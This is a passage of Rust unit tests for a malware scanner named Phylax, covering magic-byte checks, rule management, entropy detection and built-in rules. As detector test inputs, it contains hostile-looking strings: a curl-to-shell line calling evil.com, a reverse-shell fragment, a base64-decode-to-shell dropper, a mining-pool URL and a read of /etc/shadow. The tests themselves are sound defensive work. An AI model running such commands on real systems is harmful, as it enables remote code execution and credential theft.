        let mut data = vec![0x7f, b'E', b'L', b'F'];
        data.extend_from_slice(&[0u8; 100]);
        let result = scanner.scan_bytes(&data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(result
            .findings
            .iter()
            .any(|f| f.description.contains("ELF")));
    }

    #[test]
    fn magic_bytes_pe() {
        let mut scanner = default_scanner();
        let mut data = vec![b'M', b'Z'];
        data.extend_from_slice(&[0u8; 100]);
        let result = scanner.scan_bytes(&data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(result
            .findings
            .iter()
            .any(|f| f.description.contains("Windows PE")));
    }

    #[test]
    fn magic_bytes_suspicious_shebang() {
        let mut scanner = default_scanner();
        let data = b"#!/bin/bash\ncurl http://evil.com | sh\n";
        // The shebang itself doesn't contain curl — the shebang is "#!/bin/bash".
        // Our check looks at the first line only.
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        // This shebang is normal — curl is on line 2.
        assert!(!result
            .findings
            .iter()
            .any(|f| f.description.contains("shebang")));
    }

    #[test]
    fn magic_bytes_curl_shebang() {
        let mut scanner = default_scanner();
        let data = b"#!/usr/bin/curl\nhttp://evil.com\n";
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(result
            .findings
            .iter()
            .any(|f| f.description.contains("shebang")));
    }

    #[test]
    fn magic_bytes_polyglot_pdf() {
        let mut scanner = default_scanner();
        let mut data = vec![0u8; 2048];
        // Place %PDF- at offset 100.
        data[100..105].copy_from_slice(b"%PDF-");
        let result = scanner.scan_bytes(&data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(result
            .findings
            .iter()
            .any(|f| f.description.contains("polyglot")));
    }

    #[test]
    fn magic_bytes_normal_pdf() {
        let mut scanner = default_scanner();
        let mut data = vec![0u8; 2048];
        // Place %PDF- at offset 0.
        data[0..5].copy_from_slice(b"%PDF-");
        let result = scanner.scan_bytes(&data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(!result
            .findings
            .iter()
            .any(|f| f.description.contains("polyglot")));
    }

    #[test]
    fn magic_bytes_short_data() {
        let scanner = default_scanner();
        let findings = scanner.check_magic_bytes(b"hi");
        assert!(findings.is_empty());
    }

    // -----------------------------------------------------------------------
    // Rule management
    // -----------------------------------------------------------------------

    #[test]
    fn add_and_get_rule() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        assert_eq!(scanner.rules().len(), 1);
        assert!(scanner.get_rule("TEST_RULE_001").is_some());
    }

    #[test]
    fn add_multiple_rules() {
        let mut scanner = default_scanner();
        let rules = vec![sample_rule(), {
            let mut r = sample_rule();
            r.id = "TEST_RULE_002".to_string();
            r
        }];
        scanner.add_rules(rules);
        assert_eq!(scanner.rules().len(), 2);
    }

    #[test]
    fn remove_rule() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        assert!(scanner.remove_rule("TEST_RULE_001"));
        assert_eq!(scanner.rules().len(), 0);
    }

    #[test]
    fn remove_rule_not_found() {
        let mut scanner = default_scanner();
        assert!(!scanner.remove_rule("NONEXISTENT"));
    }

    #[test]
    fn set_rule_enabled() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        assert!(scanner.set_rule_enabled("TEST_RULE_001", false));
        assert!(!scanner.get_rule("TEST_RULE_001").unwrap().enabled);
        assert_eq!(scanner.enabled_rules_count(), 0);
    }

    #[test]
    fn set_rule_enabled_not_found() {
        let mut scanner = default_scanner();
        assert!(!scanner.set_rule_enabled("MISSING", true));
    }

    #[test]
    fn enabled_rules_count() {
        let mut scanner = default_scanner();
        scanner.load_builtin_rules();
        let total = scanner.rules().len();
        assert_eq!(scanner.enabled_rules_count(), total);

        scanner.set_rule_enabled("PHYLAX_EICAR_TEST", false);
        assert_eq!(scanner.enabled_rules_count(), total - 1);
    }

    #[test]
    fn load_builtin_rules() {
        let scanner = scanner_with_builtins();
        assert!(scanner.rules().len() >= 5);
        assert!(scanner.get_rule("PHYLAX_EICAR_TEST").is_some());
        assert!(scanner.get_rule("PHYLAX_SHELL_REVERSE").is_some());
        assert!(scanner.get_rule("PHYLAX_CRYPTO_MINER").is_some());
        assert!(scanner.get_rule("PHYLAX_BASE64_EXEC").is_some());
        assert!(scanner.get_rule("PHYLAX_PASSWD_ACCESS").is_some());
    }

    // -----------------------------------------------------------------------
    // Scanning
    // -----------------------------------------------------------------------

    #[test]
    fn scan_bytes_clean() {
        let mut scanner = scanner_with_builtins();
        let result = scanner.scan_bytes(
            b"perfectly normal file content",
            ScanTarget::Memory,
            ScanMode::OnDemand,
        );
        assert!(result.clean);
        assert!(result.entropy.is_some());
    }

    #[test]
    fn scan_bytes_malware_match() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        let result = scanner.scan_bytes(
            b"this file has MALWARE inside",
            ScanTarget::Memory,
            ScanMode::OnDemand,
        );
        assert!(!result.clean);
        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.findings[0].severity, ThreatSeverity::High);
        assert_eq!(result.findings[0].category, FindingCategory::Malware);
        assert!(result.findings[0].rule_id.as_deref() == Some("TEST_RULE_001"));
    }

    #[test]
    fn scan_bytes_records_offset() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        let result = scanner.scan_bytes(
            b"prefix_MALWARE_suffix",
            ScanTarget::Memory,
            ScanMode::OnDemand,
        );
        assert_eq!(result.findings[0].offset, Some(7));
    }

    #[test]
    fn scan_bytes_high_entropy() {
        let mut scanner = default_scanner();
        // Generate high-entropy data.
        let mut data = Vec::with_capacity(256 * 100);
        for _ in 0..100 {
            for b in 0u8..=255 {
                data.push(b);
            }
        }
        let result = scanner.scan_bytes(&data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.category == FindingCategory::Ransomware),
            "should detect high entropy"
        );
    }

    #[test]
    fn scan_bytes_updates_stats() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        scanner.scan_bytes(b"MALWARE here", ScanTarget::Memory, ScanMode::OnDemand);
        let stats = scanner.stats();
        assert_eq!(stats.total_scans, 1);
        assert_eq!(stats.dirty_scans, 1);
        assert!(stats.total_findings >= 1);
    }

    #[test]
    fn scan_history_retained() {
        let mut scanner = default_scanner();
        scanner.scan_bytes(b"one", ScanTarget::Memory, ScanMode::OnDemand);
        scanner.scan_bytes(b"two", ScanTarget::Memory, ScanMode::Scheduled);
        assert_eq!(scanner.scan_history().len(), 2);
    }

    #[test]
    fn scan_history_max_enforced() {
        let mut scanner = PhylaxScanner::new(PhylaxConfig {
            max_history: 3,
            ..PhylaxConfig::default()
        });
        for i in 0..5 {
            scanner.scan_bytes(
                format!("scan {i}").as_bytes(),
                ScanTarget::Memory,
                ScanMode::OnDemand,
            );
        }
        assert_eq!(scanner.scan_history().len(), 3);
    }

    #[test]
    fn last_scan() {
        let mut scanner = default_scanner();
        assert!(scanner.last_scan().is_none());
        scanner.scan_bytes(b"data", ScanTarget::Memory, ScanMode::OnDemand);
        assert!(scanner.last_scan().is_some());
    }

    #[test]
    fn scans_for_target() {
        let mut scanner = default_scanner();
        let target1 = ScanTarget::Agent("agent-1".into());
        let target2 = ScanTarget::Agent("agent-2".into());
        scanner.scan_bytes(b"a", target1.clone(), ScanMode::OnDemand);
        scanner.scan_bytes(b"b", target2, ScanMode::OnDemand);
        scanner.scan_bytes(b"c", target1.clone(), ScanMode::Scheduled);
        assert_eq!(scanner.scans_for_target(&target1).len(), 2);
    }

    #[test]
    fn dirty_scans_filter() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        scanner.scan_bytes(b"clean", ScanTarget::Memory, ScanMode::OnDemand);
        scanner.scan_bytes(b"MALWARE", ScanTarget::Memory, ScanMode::OnDemand);
        let dirty = scanner.dirty_scans(ThreatSeverity::High);
        assert_eq!(dirty.len(), 1);
    }

    // -----------------------------------------------------------------------
    // ScanResult methods
    // -----------------------------------------------------------------------

    #[test]
    fn scan_result_max_severity_empty() {
        let result = ScanResult {
            id: "test".into(),
            target: ScanTarget::Memory,
            mode: ScanMode::OnDemand,
            started_at: Utc::now(),
            completed_at: Utc::now(),
            findings: vec![],
            entropy: None,
            file_size: None,
            clean: true,
        };
        assert_eq!(result.max_severity(), ThreatSeverity::Info);
    }

    #[test]
    fn scan_result_max_severity_mixed() {
        let result = ScanResult {
            id: "test".into(),
            target: ScanTarget::Memory,
            mode: ScanMode::OnDemand,
            started_at: Utc::now(),
            completed_at: Utc::now(),
            findings: vec![
                ScanFinding::new(
                    ThreatSeverity::Low,
                    FindingCategory::Suspicious,
                    "low",
                    "fix",
                ),
                ScanFinding::new(
                    ThreatSeverity::Critical,
                    FindingCategory::Malware,
                    "crit",
                    "fix",
                ),
                ScanFinding::new(
                    ThreatSeverity::Medium,
                    FindingCategory::Suspicious,
                    "med",
                    "fix",
                ),
            ],
            entropy: None,
            file_size: None,
            clean: false,
        };
        assert_eq!(result.max_severity(), ThreatSeverity::Critical);
    }

    #[test]
    fn scan_result_count_by_severity() {
        let result = ScanResult {
            id: "test".into(),
            target: ScanTarget::Memory,
            mode: ScanMode::OnDemand,
            started_at: Utc::now(),
            completed_at: Utc::now(),
            findings: vec![
                ScanFinding::new(ThreatSeverity::High, FindingCategory::Malware, "a", "fix"),
                ScanFinding::new(ThreatSeverity::High, FindingCategory::Malware, "b", "fix"),
                ScanFinding::new(ThreatSeverity::Low, FindingCategory::Suspicious, "c", "fix"),
            ],
            entropy: None,
            file_size: None,
            clean: false,
        };
        assert_eq!(result.count_by_severity(ThreatSeverity::High), 2);
        assert_eq!(result.count_by_severity(ThreatSeverity::Low), 1);
        assert_eq!(result.count_by_severity(ThreatSeverity::Critical), 0);
    }

    // -----------------------------------------------------------------------
    // ScanFinding builder
    // -----------------------------------------------------------------------

    #[test]
    fn scan_finding_builder() {
        let f = ScanFinding::new(
            ThreatSeverity::High,
            FindingCategory::Malware,
            "test finding",
            "remediation",
        )
        .with_rule("RULE_001")
        .with_offset(42);

        assert_eq!(f.severity, ThreatSeverity::High);
        assert_eq!(f.rule_id.as_deref(), Some("RULE_001"));
        assert_eq!(f.offset, Some(42));
        assert!(!f.id.is_empty());
    }

    // -----------------------------------------------------------------------
    // Config & state
    // -----------------------------------------------------------------------

    #[test]
    fn default_config_values() {
        let cfg = PhylaxConfig::default();
        assert!(cfg.realtime_enabled);
        assert!(cfg.scan_on_install);
        assert!(cfg.scan_on_exec);
        assert_eq!(cfg.entropy_threshold, 7.5);
        assert_eq!(cfg.max_scan_size, 100 * 1024 * 1024);
        assert!(cfg.aegis_integration);
        assert_eq!(cfg.max_history, 10_000);
    }

    #[test]
    fn with_defaults_constructor() {
        let scanner = PhylaxScanner::with_defaults();
        assert!(scanner.config().realtime_enabled);
        assert_eq!(scanner.rules().len(), 0);
    }

    #[test]
    fn set_config() {
        let mut scanner = default_scanner();
        let mut new_cfg = PhylaxConfig::default();
        new_cfg.entropy_threshold = 6.0;
        scanner.set_config(new_cfg);
        assert_eq!(scanner.config().entropy_threshold, 6.0);
    }

    #[test]
    fn mark_signatures_updated() {
        let mut scanner = default_scanner();
        assert!(scanner.stats().last_signature_update.is_none());
        scanner.mark_signatures_updated();
        assert!(scanner.stats().last_signature_update.is_some());
    }

    // -----------------------------------------------------------------------
    // Path checks
    // -----------------------------------------------------------------------

    #[test]
    fn is_excluded() {
        let scanner = default_scanner();
        assert!(scanner.is_excluded(Path::new("/proc/1/maps")));
        assert!(scanner.is_excluded(Path::new("/sys/class/net")));
        assert!(scanner.is_excluded(Path::new("/dev/null")));
        assert!(!scanner.is_excluded(Path::new("/home/user/file")));
    }

    #[test]
    fn is_watched() {
        let scanner = default_scanner();
        assert!(scanner.is_watched(Path::new("/var/lib/agnos/agents/myagent")));
        assert!(scanner.is_watched(Path::new("/tmp/download.bin")));
        assert!(!scanner.is_watched(Path::new("/home/user/file")));
    }

    // -----------------------------------------------------------------------
    // Stats
    // -----------------------------------------------------------------------

    #[test]
    fn stats_initial() {
        let scanner = default_scanner();
        let stats = scanner.stats();
        assert_eq!(stats.total_scans, 0);
        assert_eq!(stats.clean_scans, 0);
        assert_eq!(stats.dirty_scans, 0);
        assert_eq!(stats.total_findings, 0);
        assert_eq!(stats.rules_loaded, 0);
    }

    #[test]
    fn stats_after_scans() {
        let mut scanner = scanner_with_builtins();
        scanner.scan_bytes(b"clean data", ScanTarget::Memory, ScanMode::OnDemand);
        // Trigger a builtin: /etc/shadow reference.
        scanner.scan_bytes(b"/etc/shadow", ScanTarget::Memory, ScanMode::Scheduled);
        let stats = scanner.stats();
        assert_eq!(stats.total_scans, 2);
        assert!(stats.rules_loaded >= 5);
        assert!(stats.last_scan_at.is_some());
    }

    // -----------------------------------------------------------------------
    // Aegis integration
    // -----------------------------------------------------------------------

    #[test]
    fn findings_for_aegis_enabled() {
        let mut scanner = default_scanner();
        scanner.add_rule(sample_rule());
        scanner.scan_bytes(b"MALWARE", ScanTarget::Memory, ScanMode::OnDemand);
        let aegis_findings = scanner.findings_for_aegis();
        assert!(!aegis_findings.is_empty());
    }

    #[test]
    fn findings_for_aegis_disabled() {
        let mut scanner = PhylaxScanner::new(PhylaxConfig {
            aegis_integration: false,
            ..PhylaxConfig::default()
        });
        scanner.add_rule(sample_rule());
        scanner.scan_bytes(b"MALWARE", ScanTarget::Memory, ScanMode::OnDemand);
        let aegis_findings = scanner.findings_for_aegis();
        assert!(aegis_findings.is_empty());
    }

    #[test]
    fn findings_for_aegis_threshold() {
        let mut scanner = PhylaxScanner::new(PhylaxConfig {
            aegis_report_threshold: ThreatSeverity::Critical,
            ..PhylaxConfig::default()
        });
        // Medium rule won't pass Critical threshold.
        scanner.add_rule(YaraRule {
            id: "LOW_RULE".to_string(),
            description: "Low finding".to_string(),
            category: FindingCategory::Suspicious,
            severity: ThreatSeverity::Medium,
            patterns: vec!["74657374".to_string()], // "test"
            tags: vec![],
            enabled: true,
        });
        scanner.scan_bytes(b"test", ScanTarget::Memory, ScanMode::OnDemand);
        let aegis_findings = scanner.findings_for_aegis();
        assert!(
            aegis_findings.is_empty(),
            "Medium findings should not pass Critical threshold"
        );
    }

    // -----------------------------------------------------------------------
    // Builtin rule matching
    // -----------------------------------------------------------------------

    #[test]
    fn builtin_detects_reverse_shell() {
        let mut scanner = scanner_with_builtins();
        let data = b"/bin/sh -i >& /dev/tcp";
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.severity == ThreatSeverity::Critical),
            "should detect reverse shell"
        );
    }

    #[test]
    fn builtin_detects_crypto_miner() {
        let mut scanner = scanner_with_builtins();
        let data = b"connect to stratum+tcp://pool.example.com";
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PHYLAX_CRYPTO_MINER")),
            "should detect crypto miner"
        );
    }

    #[test]
    fn builtin_detects_base64_dropper() {
        let mut scanner = scanner_with_builtins();
        let data = b"echo payload | base64 -d | sh";
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PHYLAX_BASE64_EXEC")),
            "should detect base64 dropper"
        );
    }

    #[test]
    fn builtin_detects_shadow_access() {
        let mut scanner = scanner_with_builtins();
        let data = b"cat /etc/shadow";
        let result = scanner.scan_bytes(data, ScanTarget::Memory, ScanMode::OnDemand);
        assert!(
            result
                .findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PHYLAX_PASSWD_ACCESS")),
            "should detect shadow access"
        );
    }

    #[test]
    fn builtin_clean_data() {
        let mut scanner = scanner_with_builtins();
        let result = scanner.scan_bytes(
            b"Hello world, this is perfectly safe text content for testing.",
            ScanTarget::Memory,
            ScanMode::OnDemand,
        );
        assert!(result.clean, "normal text should be clean");
    }
}
